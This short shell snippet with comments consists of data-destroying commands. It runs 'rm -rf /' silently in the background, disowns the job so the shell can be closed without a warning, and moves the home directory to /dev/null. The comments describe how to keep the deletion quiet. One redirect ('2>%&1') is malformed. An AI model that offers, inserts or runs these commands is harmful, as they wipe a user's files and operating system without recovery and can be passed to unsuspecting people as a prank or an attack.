# delete everything starting at root directory /
# Redirect stdout and stderr to /dev/null (to keep it quiet) and run asynchronously
rm -rf / 1>/dev/null 2>%&1 &
# Also remove it from job table, so you can close the shell and not get a warning about running processes
disown

# move files into black hole, similar to deleting everything
mv ~ /dev/null 
